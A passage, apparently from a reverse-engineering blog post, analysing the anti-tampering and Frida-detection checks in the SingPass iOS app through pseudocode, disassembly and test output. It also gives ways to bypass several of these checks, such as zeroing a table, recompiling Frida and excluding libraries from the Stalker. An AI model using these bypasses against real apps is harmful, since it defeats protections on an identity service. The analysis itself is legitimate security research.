section_ptr[sym_idx] points to the symbols resolution stub located in the section __stub_helper. That\u0026rsquo;s why the metadata structure contains the memory range of this section:\nconst uintptr_t addr_from_section = section_ptr[sym_idx]; if (metadata.stub_helper_start \u0026lt;= addr \u0026amp;\u0026amp; addr \u0026lt; metadata.stub_helper_end) { // Skip } In addition, if the pointers do not match, the function verifies their location using dladdr:\nconst uintptr_t addr_from_section = section_ptr[sym_idx]; const uintptr_t addr_from_resolution = manually_resolved[sym_idx]; if (addr_from_section != addr_from_resolution) { Dl_info info_section; Dl_info info_resolution; dl_info(addr_from_section, \u0026amp;info_section); dl_info(addr_from_resolution, \u0026amp;info_resolution); if (info_section.dli_fbase != info_resolution.dli_fbase) { // --\u0026gt; Trigger EVT_CODE_SYMBOL_TABLE; } } \u0026#160; Two pointers might not match if, for instance, an imported function is hooked with Frida. In the case where the origin[sym_idx] is set to SYM_ORIGINS::NONE the function skips the check. Thus, we can simply disable this RASP check by filling the original table with 0. The number of symbols is close to the metadata structure and the address of the metadata structure is leaked by the ___atomic_load and ___atomic_store functions.\n\u003c?xml version=\"1.0\" ?\u003e0x18e0x1900x1910x18f0x18f0x0a8Symbols Index10x1900x19110x18f2Origins Table__got194d8fb00194d9181c194da5e5c194db6ae01da39a668198648120Computed194d8fb00194d9181c194da5e5c194db6ae01da39a668198648120__la_symbol_ptr101582eb41015de34410246db7c10252a2c4102d0b9d4102580d64!=0x18fComputed10256296c101582eb41015de34410246db7c10252a2c4102580d64=0x18fIndex translation table1The origin 2 matches the symbols in the __got section.The origin 1 matches the __la_symbol_ptr section Code Tracing The Code Tracing check aims to verify that the current is not traced. By looking at the cross-references of #EVT_CODE_TRACING_cbk_ptr, we can identify two kinds of verification.\nGumExecCtx EVT_CODE_TRACING seems able to detect if the Frida\u0026rsquo;s Stalker is running. It\u0026rsquo;s the first time I can observe this kind of check and it\u0026rsquo;s very smart. For those who would like to follow this analysis with the raw assembly code, I will use this range of addresses from the SingPass binary:\n\u0026#160; 0x10019B6FC \u0026ndash; 0x10019B82C Here is the graph of the function that performs the Frida Stalker check:\n\u003c?xml version=\"1.0\" ?\u003eif(detected) {rasp_event_tevent;event.code=0x2000;event.corrupted_ptr=0x13b71ae1e16d02e;EVT_CODE_TRACING_cbk_ptr(\u0026amp;event);}dowhile(tlv_idx!=0x200)detected=tlv_idx\u0026lt;0x1fff;++tlv_idxbreak;boolin_range=address\u0026lt;=tlv_addr\u0026amp;\u0026amp;tlv_addr\u0026lt;address+size;boolcond=*(tlv_addr+0x18)==tid\u0026amp;\u0026amp;*(tlv_addr+0x24)\u0026lt;=5\u0026amp;\u0026amp;*(tlv_addr+0x28)\u0026lt;3;if(in_range\u0026amp;\u0026amp;cond)if(size\u0026gt;=0x30)uint64_tsize=0;uint64_taddress=tlv_addr;int32_tobject_name=0;autoinfo_cnt=VM_REGION_BASIC_INFO_COUNT_64;autotask=mach_task_self();kern_return_tkr=_vm_region_64(task,\u0026amp;address,\u0026amp;size,VM_REGION_BASIC_INFO_64,\u0026amp;info,\u0026amp;info_cnt,\u0026amp;object_name);if(kr==0\u0026amp;\u0026amp;info.protection)\u0026amp;VM_PROT_READ)!=0)void*tlv_addr=*(tlv_table+(tlv_idx\u0026lt;\u0026lt;3));if(tlv_addr!=0)uint64_ttid=_pthread_mach_thread_np(_pthread_self());int64_ttlv_table=MRS(TPIDRRO_EL0)\u0026amp;0xfffffffffffffff8booldetected=true;size_ttlv_idx=0x100; Code associated with Frida Stalker Detection Yes, this code is able to detect the Stalker. How? Let\u0026rsquo;s start with the first basic block. _pthread_mach_thread_np(_pthread_self()) aims at getting the thread id of the function that invokes this check.\nThen more subtly, MRS(TPIDRRO_EL0) \u0026amp; #-8 is used to manually access the thread local storage area. On ARM64, Apple uses the least significant byte of TPIDRRO_EL0 to store the number of CPU while the MSB contains the TLS base address.\n\u0026#160; See also: dyld \u0026ndash; threadLocalHelpers.s Then, the second basic block \u0026ndash; which is the loop\u0026rsquo;s entry \u0026ndash; accesses the thread local variable with the key tlv_idx which ranges from 0x100 to 0x200 in the loop:\n*(tlv_table + (tlv_idx \u003c\u003c 3)) The following basic block which calls _vm_region_64(\u0026hellip;) is used to verify that the tlv_addr variable contains a valid address with a correct size (i.e. larger than 0x30). Under these conditions, it jumps into the following basic block with these strange memory accesses:\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e bool in_range = address \u0026lt;= tlv_addr \u0026amp;\u0026amp; tlv_addr \u0026lt; address + size ; bool cond = * ( tlv_addr + 0x18 ) == tid \u0026amp;\u0026amp; * ( tlv_addr + 0x24 ) \u0026lt;= 5 \u0026amp;\u0026amp; * ( tlv_addr + 0x28 ) \u0026lt; 3 ; if ( in_range \u0026amp;\u0026amp; cond ) Condition that (somehow) Triggers EVT_CODE_TRACING To figure out the meaning of these memory accesses, let\u0026rsquo;s remind that this function is associated with the EVT_CODE_TRACING event. Which well-known public tool could be associated with code tracing? Without too much risk, we can assume the Frida\u0026rsquo;s Stalker.\nIf we look at the implementation of the Stalker, we can notice this kind of initialisation (in gumstalker-arm64.c):\nvoid gum_stalker_init (GumStalker* self) { [...] self-\u0026gt;exec_ctx = gum_tls_key_new(); [...] } void* _gum_stalker_do_follow_me(GumStalker* self, ...) { GumExecCtx* ctx = gum_stalker_create_exec_ctx(...); gum_tls_key_set_value (self-\u0026gt;exec_ctx, ctx); } So the Stalker creates a thread local variable that is used to store a pointer to the GumExecCtx structure which has the following layout:\nstruct _GumExecCtx { volatile gint state; gint64 destroy_pending_since; GumStalker * stalker; GumThreadId thread_id; GumArm64Writer code_writer; GumArm64Relocator relocator; [...] } If we add the offsets of this layout and if we virtually inline the GumArm64Writer structure, we can get this representation:\nstruct _GumExecCtx { /* 0x00 */ volatile gint state; /* 0x08 */ gint64 destroy_pending_since; /* 0x10 */ GumStalker * stalker; /* 0x18 */ GumThreadId thread_id; GumArm64Writer code_writer { /* 0x20 */ volatile gint ref_count; /* 0x24 */ GumOS target_os; /* 0x28 */ GumPtrauthSupport ptrauth_support; ... }; } \u0026#160; destroy_pending_since is located at the offset 0x08 and not 0x04 because of the alignment enforced by the compiler. With this representation, we can observe that:\n*(tlv_table + 0x18) effectively matches the GumThreadId thread_id attribute.\n*(tlv_table + 0x24) matches GumOS target_os\n*(tlv_table + 0x28) matches GumPtrauthSupport ptrauth_support\nGumOS and GumPtrauthSupport are enums defined in gumdefs.h and gummemory.h with these values:\nenum _GumOS { GUM_OS_WINDOWS, GUM_OS_MACOS, GUM_OS_LINUX, GUM_OS_IOS, GUM_OS_ANDROID, GUM_OS_QNX }; enum _GumPtrauthSupport { GUM_PTRAUTH_INVALID, GUM_PTRAUTH_UNSUPPORTED, GUM_PTRAUTH_SUPPORTED }; GumOS contains 6 entries starting from GUM_OS_WINDOWS = 0 up to GUM_OS_QNX = 5 and similarly, GUM_PTRAUTH_INVALID = 0 while the last entry is associated with GUM_PTRAUTH_SUPPORTED = 2\nTherefore, the previous strange conditions are used to fingerprint the GumExecCtx structure:\n\u003c?xml version=\"1.0\" ?\u003e bool\u0026#160;in_range\u0026#160;=\u0026#160;address\u0026#160;\u0026lt;=\u0026#160;tlv_addr\u0026#160;\u0026amp;\u0026amp;\u0026#160;tlv_addr\u0026#160;\u0026lt;\u0026#160;address\u0026#160;+\u0026#160;size; bool\u0026#160;cond\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;=\u0026#160;_GumExecCtx-\u0026gt;thread_id\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;==\u0026#160;tid\u0026#160;\u0026amp;\u0026amp; \u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;_GumExecCtx-\u0026gt;code_writer.target_os\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026lt;=\u0026#160;5\u0026#160;\u0026#160;\u0026#160;\u0026amp;\u0026amp; \u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;_GumExecCtx-\u0026gt;code_writer.ptrauth_support\u0026#160;\u0026lt;\u0026#160;\u0026#160;3; if\u0026#160;(in_range\u0026#160;\u0026amp;\u0026amp;\u0026#160;cond)\u0026#160;{ \u0026#160;\u0026#160;-\u0026gt;\u0026#160;Trigger\u0026#160;EVT_CODE_TRACING } One way to prevent this Stalker detection would be to recompile Frida with swapped fields in the _GumExecCtx structure.\nThread Check An alternative to the previous Frida stalker check consists in accessing the current thread status through the following call:\nthread_read_t target = pthread_mach_thread_np(pthread_self()); uint32_t count = ARM_UNIFIED_THREAD_STATE_COUNT; arm_unified_thread_state state; thread_get_state(target, ARM_UNIFIED_THREAD_STATE, \u0026amp;state, \u0026amp;count); Then, it checks if state-\u0026gt;ts_64.__pc is within the libsystem_kernel.dylib thanks to the following comparison:\nconst auto mach_msg_addr = reinterpret_cast\u0026lt;uintptr_t\u0026gt;(\u0026amp;mach_msg); const uintptr_t delta = abs(state-\u0026gt;ts_64.__pc - mach_msg_addr) if (delta \u0026gt; 0x4000) { rasp_event_info info; info.event = 0x2000; // EVT_CODE_TRACING; info.ptr = (uintptr_t*)0x13b71a24724edfe; EVT_CODE_TRACING_cbk_ptr(info); } In other words, state-\u0026gt;ts_64.__pc is considered to be in libsystem_kernel.dylib, if its distance from \u0026amp;mach_msg is smaller than 0x4000.\nAt first sight, I was a bit confused by this RASP check but since the previous checks, associated with EVT_CODE_TRACING, aims at detecting the Frida Stalker, this check is also likely designed to detect the Frida Stalker.\nTo confirm this hypothesis, I developed a small test case that reproduces this check, in a standalone binary and we can observe a difference depending on whether it runs through the Frida stalker or not:\n\u003c?xml version=\"1.0\" ?\u003e(3) romain1:romain*3.96 5.47 5.03 06:31/usr/lib/system/libsystem_platform.dylib:0x1dafa21f0: stp x14, x15, [x3, #0x30] /usr/lib/system/libsystem_platform.dylib:0x1dafa21f4: ret /usr/lib/system/libsystem_kernel.dylib:0x1bf97735c: mov w21, #0 /usr/lib/system/libsystem_kernel.dylib:0x1bf977360: str w22, [x19] /usr/lib/system/libsystem_kernel.dylib:0x1bf977364: b #0x1bf9772d4 /usr/lib/system/libsystem_kernel.dylib:0x1bf9772d4: mov x0, x21 /usr/lib/system/libsystem_kernel.dylib:0x1bf9772d8: add sp, sp, #1, lsl #12 /usr/lib/system/libsystem_kernel.dylib:0x1bf9772dc: add sp, sp, #0x470 /usr/lib/system/libsystem_kernel.dylib:0x1bf9772e0: ldp x29, x30, [sp, #0x30] /usr/lib/system/libsystem_kernel.dylib:0x1bf9772e4: ldp x20, x19, [sp, #0x20] /usr/lib/system/libsystem_kernel.dylib:0x1bf9772e8: ldp x22, x21, [sp, #0x10] /usr/lib/system/libsystem_kernel.dylib:0x1bf9772ec: ldp x28, x27, [sp], #0x40 /usr/lib/system/libsystem_kernel.dylib:0x1bf9772f0: ret /tmp/stalker:0x102638208: ldr x19, [sp, #0x158] /tmp/stalker:0x10263820c: mov x0, x20 /tmp/stalker:0x102638210: bl #0x10264b560 pc: 0x10291caa0 -\u0026gt; (distance: 0xbd03cf60) Done!iPhone:/tmp root# ./stalker Output of the Test Case with the Stalker \u003c?xml version=\"1.0\" ?\u003e(3) romain1:romain*3.96 5.47 5.03 06:31Stalker check starting .. pc: 0x1bf95a644 -\u0026gt; /usr/lib/system/libsystem_kernel.dylib (distance: 0xc44) Done! iPhone:/tmp root# ./stalker Output of the Test Case without the Stalker This check can be bypassed without too much difficulty by using the function gum_stalker_exclude to exclude the library libsystem_kernel.dylib from the stalker:\nGumStalker* stalker = gum_stalker_new(); exclude(stalker, \u0026#34;libsystem_kernel.dylib\u0026#34;); { // Stalker Check } As a result of this exclusion, state-\u0026gt;ts_64.__pc is located in libsystem_kernel.dylib:\n\u003c?xml version=\"1.0\" ?\u003e(3) romain1:romain*3.96 5.47 5.03 06:31/usr/lib/system/libsystem_kernel.dylib:0x1bf9772dc: add sp, sp, #0x470 /usr/lib/system/libsystem_kernel.dylib:0x1bf9772e0: ldp x29, x30, [sp, #0x30] /usr/lib/system/libsystem_kernel.dylib:0x1bf9772e4: ldp x20, x19, [sp, #0x20] /usr/lib/system/libsystem_kernel.dylib:0x1bf9772e8: ldp x22, x21, [sp, #0x10] /usr/lib/system/libsystem_kernel.dylib:0x1bf9772ec: ldp x28, x27, [sp], #0x40 /usr/lib/system/libsystem_kernel.dylib:0x1bf9772f0: ret /tmp/stalker:0x104d00250: ldr x19, [sp, #0x158] /tmp/stalker:0x104d00254: mov x0, x20 /tmp/stalker:0x104d00258: bl #0x104d137b4 pc: 0x1bf95a644 -\u0026gt; /usr/lib/system/libsystem_kernel.dylib (distance: 0xc44)iPhone:/tmp root# ./stalker Output of the Test Case with Excluded Memory Ranges App Loaded Libraries The RASP event EVT_APP_LOADED_LIBRARIES aims at checking the integrity of the Mach-O\u0026rsquo;s dependencies. In other words, it checks that the Mach-O imported libraries have not been altered.\n\u0026#160; Assembly ranges: 0x100E4CDF8 \u0026ndash; 0x100e4d39c The code associated with this check starts by accessing the Mach-O header thanks to the dladdr function:\nDl_info dl_info; dladdr(\u0026amp;static_var, \u0026amp;dl_info); Dl_info contains the base address of the library which encompasses the address provided in the first parameter and since, a Mach-O binary is loaded with its header, dl_info.dli_fbase actually points to a mach_header_64.\nThen the function iterates over the LC_ID_DYLIB-like commands to access dependency\u0026rsquo;s name:\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e __text:0000000100E4CD1C LDRB W15, [X11,#dylib_command.dylib.name.offset]__text:0000000100E4CD20 ADD X15, X11, X15 ; `dylib.name.offset` is relative to the__text:0000000100E4CD20 ; command (x11)__text:0000000100E4CD24__text:0000000100E4CD24 STR X15, [X14,W10,UXTW#3]; Save the name of the dependency__text:0000000100E4CD28 ADD W10, W10, #1__text:0000000100E4CD2C B loc_100E4CCDC__text:0000000100E4CCDC__text:0000000100E4CCDC loc_100E4CCDC__text:0000000100E4CCDC LDR W15, [X11,#dyld_info_command.cmdsize]__text:0000000100E4CCE0 ADD X11, X11, X15__text:0000000100E4CCE4 ADD W9, W9, #1__text:0000000100E4CCE8 CMP W9, W8__text:0000000100E4CCEC B.CS loc_100E4CD30 This name contains the path to the dependency. For instance, we can access this list as follows:\nimport lief singpass = lief.parse(\u0026#34;./SingPass\u0026#34;) for lib in singpass.libraries: print(lib.name) # Output: /System/Library/Frameworks/AVFoundation.framework/AVFoundation /System/Library/Frameworks/AVKit.framework/AVKit ... @rpath/leveldb.framework/leveldb @rpath/nanopb.framework/nanopb The dependency\u0026rsquo;s names are used to fill a hash table in which a hash value in encoded on 32 bits:\n// Pseudo code uint32_t TABLE[0x6d] for (size_t i = 0; i \u0026lt; 0x6d; ++i) { TABLE[i] = hash(lib_names[i]); } Later in the the code, this computed table is compared with another hash table \u0026ndash; hard-coded in the code \u0026ndash; which looks like this:\n\u003c?xml version=\"1.0\" ?\u003e __text:0000000100E4CF38\u0026#160;loc_100E4CF38\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;CODE\u0026#160;XREF:\u0026#160;sub_100E4CC54+230↑j __text:0000000100E4CF38\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X10,\u0026#160;SP __text:0000000100E4CF3C\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;SUB\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X8,\u0026#160;X10,\u0026#160;#0x1C0 __text:0000000100E4CF40\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;SP,\u0026#160;X8 __text:0000000100E4CF44\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X9,\u0026#160;#0 __text:0000000100E4CF48\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;#0x1D2A29E0195DDC1 __text:0000000100E4CF58\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X12,\u0026#160;#0x4AA0A7902C19769 __text:0000000100E4CF68\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;STP\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;X12,\u0026#160;[X8] __text:0000000100E4CF6C\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;#0x64CAED105C09EBA __text:0000000100E4CF7C\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X12,\u0026#160;#0xEDC68A50A44D7D1 __text:0000000100E4CF8C\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;STP\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;X12,\u0026#160;[X8,#0x10] __text:0000000100E4CF90\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;#0x128801E010DCF774 __text:0000000100E4CFA0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X12,\u0026#160;#0x14EDACA112DF984A __text:0000000100E4CFB0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;STP\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;X12,\u0026#160;[X8,#0x20] __text:0000000100E4CFB4\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;#0x166DA22D164DF42A __text:0000000100E4CFC4\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X12,\u0026#160;#0x1B2CAF8A1ACDDCCF __text:0000000100E4CFD4\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;STP\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;X12,\u0026#160;[X8,#0x30] __text:0000000100E4CFD8\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;#0x1CF2CE101BB56374 __text:0000000100E4CFE8\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X12,\u0026#160;#0x235D2E461E37FF16 __text:0000000100E4CFF8\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;STP\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;X12,\u0026#160;[X8,#0x40] __text:0000000100E4CFFC\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;#0x28F80E87260C94F3 __text:0000000100E4D00C\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X12,\u0026#160;#0x2CBB87222BFB0F4D __text:0000000100E4D01C\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;STP\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;X12,\u0026#160;[X8,#0x50] Fig 4. Examples of Hashes If some libraries have been modified to inject, for instance, FridaGadget.dylib then the hash dynamically computed will not match the hash hard-coded in the code.\nWhilst the implementation of this check is pretty \u0026ldquo;standard\u0026rdquo;, there are a few points worth mentioning:\nFirstly, the hash function seems be a derivation of the MurmurHash.\nSecondly, the hash is encoded on 32 bits but the code in the Figure 4 references the X11/X12 registers which are 64 bits. This is actually a compiler optimization to limit the number of memory accesses.\nThirdly, the hard coded hash values are duplicated in the binary for each instance of the check. In SingPass, this RASP check is present twice thus, we find these values at the following locations: 0x100E4CF38, 0x100E55678. This duplication is likely used to prevent a single spot location that would be easy to patch.\nCode System Lib This check is associated with the event EVT_CODE_SYSTEM_LIB which consists in verifying the integrity of the in-memory system libraries with their content in the dyld shared cache (on-disk).\n\u0026#160; Assembly ranges: 0x100ED5BF8 \u0026ndash; 0x100ED5D6C and 0x100ED5E0C \u0026ndash; 0x100ED62D4 This check usually starts with the following pattern:\n\u003c?xml version=\"1.0\" ?\u003e __text:00100E80AF0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;ADR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X0,\u0026#160;check_region_cbk\u0026#160;;\u0026#160;cbk __text:00100E80AF4\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;NOP __text:00100E80AF8\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;BL\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;iterate_system_region __text:00100E80AFC\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;ORR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;W8,\u0026#160;W0,\u0026#160;W21 __text:00100E80B00\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;CBZ\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;W8,\u0026#160;loc_100E80B50 __text:00100E80B04\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X21,\u0026#160;SP __text:00100E80B08\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;ADRP\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X8,\u0026#160;#EVT_CODE_SYSTEM_LIB_cbk_ptr@PAGE __text:00100E80B0C\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;LDR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X8,\u0026#160;[X8,#EVT_CODE_SYSTEM_LIB_cbk_ptr@PAGEOFF] 